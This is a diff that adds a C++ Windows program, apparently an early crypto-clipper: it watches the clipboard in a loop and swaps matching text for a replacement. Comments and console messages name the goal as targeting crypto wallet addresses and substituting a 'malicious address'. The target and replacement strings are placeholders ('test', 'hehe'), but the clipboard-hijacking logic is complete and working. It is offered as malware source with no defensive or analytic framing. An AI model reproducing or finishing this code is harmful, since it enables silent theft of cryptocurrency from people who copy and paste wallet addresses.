@@ -1,0 +1,74 @@
+#include <iostream>
+#include <windows.h>
+#include <string>
+#include <thread>
+#include <chrono>
+
+using namespace std;
+
+string getClipboardText()
+{
+    if (!OpenClipboard(nullptr))
+    {
+        return "";
+    }
+
+    HANDLE hData = GetClipboardData(CF_TEXT);
+    if (hData == nullptr)
+    {
+        CloseClipboard();
+        return "";
+    }
+
+    char *pszText = static_cast<char *>(GlobalLock(hData));
+    string text = pszText ? pszText : "";
+    GlobalUnlock(hData);
+    CloseClipboard();
+    return text;
+}
+
+void SetClipboardText(const string &text)
+{
+    if (!OpenClipboard(nullptr))
+    {
+        return;
+    }
+
+    EmptyClipboard();
+    HGLOBAL hGlob = GlobalAlloc(GMEM_FIXED, text.size() + 1);
+    if (!hGlob)
+    {
+        CloseClipboard();
+        return;
+    }
+
+    memcpy(hGlob, text.c_str(), text.size() + 1);
+    SetClipboardData(CF_TEXT, hGlob);
+    CloseClipboard();
+}
+
+int main()
+{
+    setlocale(LC_ALL, "");
+
+    // target crypto any wallets addresses
+    string targets = "test";
+
+    string lastClipboardContent = "";
+
+    while (true)
+    {
+        string currentText = getClipboardText();
+
+        if (!currentText.empty() && currentText == targets)
+        {
+            cout << "Target clipboard content detected: " << currentText << endl;
+            SetClipboardText("hehe");
+            cout << "Clipboard content replaced with malicious address." << endl;
+        }
+
+        this_thread::sleep_for(chrono::milliseconds(500));
+    }
+
+    return 0;
+}
